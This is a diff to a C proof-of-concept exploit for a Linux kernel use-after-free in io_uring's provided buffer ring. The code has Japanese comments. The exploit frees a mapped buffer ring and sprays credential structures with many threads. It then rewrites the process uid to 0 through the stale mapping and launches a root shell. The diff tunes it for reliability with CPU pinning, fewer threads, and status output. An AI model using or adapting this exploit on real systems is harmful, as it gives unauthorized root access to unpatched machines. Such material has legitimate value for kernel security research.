@@ -1,3 +1,5 @@
+#define _GNU_SOURCE
+
 #include <unistd.h>
 #include <err.h>
 #include <string.h>
@@ -11,7 +13,7 @@
 #include <sys/wait.h>
 #include <pthread.h>
 
-const int THREAD_NUM = 1000;
+const int THREAD_NUM = 500;
 
 struct state {
     // cred spray の準備が整ったか
@@ -46,7 +48,7 @@ void *setcap_worker(void *param) {
         usleep(1000);
     }
 
-    if (syscall(SYS_capset, &cap_header, (void *)cap_data)) errExit("capset() failed");
+    if (syscall(SYS_capset, &cap_header, (void *)cap_data)) errExit("[-] capset() failed");
 
     while (1) {
         pthread_mutex_lock(&lock);
@@ -66,21 +68,35 @@ void *setcap_worker(void *param) {
         pthread_mutex_unlock(&lock);
         usleep(1000);
     }
-    printf("Now, I am root!\n");
+    puts("[+] Now, I am root!");
     system("/bin/sh");
-    sleep(500);
     return NULL;
 }
 
+void pinning_thread(int core) {
+  cpu_set_t mask;
+
+  CPU_ZERO(&mask);
+  CPU_SET(core, &mask);
+
+  if (pthread_setaffinity_np(pthread_self(), sizeof(mask), &mask) < 0) {
+    errExit("[-] pthread_setaffinity_np");
+  }
+}
+
 int main() {
+    pinning_thread(0);
+
     pthread_t thread[THREAD_NUM];
     int ret = 0;
+    puts("[+] create threads");
     for (int i = 0; i < THREAD_NUM; i++) {
         ret = pthread_create(&thread[i], NULL, setcap_worker, NULL);
-        if (ret) errExit("failed to create thread\n");
+        if (ret) errExit("[-] failed to create thread\n");
     }
     
     // io_uring の初期化
+    puts("[+] init io_uring");
     struct io_uring ring;
     io_uring_queue_init(40, &ring, 0);
 
@@ -93,19 +109,11 @@ int main() {
     io_uring_register_buf_ring(&ring, &reg, 0);
 
     // ユーザ空間にマップ
-    void *pbuf_map = mmap(
-        NULL,
-        0x1000, 
-        PROT_READ | PROT_WRITE,
-        MAP_SHARED,
-        ring.ring_fd,
-        IORING_OFF_PBUF_RING
-    );
+    void *pbuf_map = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, ring.ring_fd, IORING_OFF_PBUF_RING);
     if (pbuf_map == MAP_FAILED) {
-        perror("[-] mmap() failed");
-        exit(1);
+        errExit("[-] mmap() failed");
     }
-    printf("[+] pbuf mapped at %p\n", pbuf_map);
+    puts("[+] map ring buffer to user space");
 
     // 他のプロセスに CPU を譲る
     for (int _ = 0; _ < 10; _++) {
@@ -114,20 +122,21 @@ int main() {
 
     // ring 解放
     io_uring_unregister_buf_ring(&ring, reg.bgid);
+    puts("[+] release ring buffer");
     state.is_ready_for_spray = true;
 
     // cred spray を待つ
     sleep(1);
     
     // Use-After-Free
-    printf("check\n");
+    puts("[+] checking if uid is in place");
     uid_t user_id = getuid();
     for (int i = 0; i < 0x1000 / sizeof(uint16_t); i++) {
         uint16_t *value = (uint16_t *)pbuf_map + i;
         if (*value == user_id) {
-            printf("found!\n");
-            *value = 0x00;
-            // break;
+            *value = 0;
+            puts("[+] rewrite uid");
+            break;
         }
     }
 
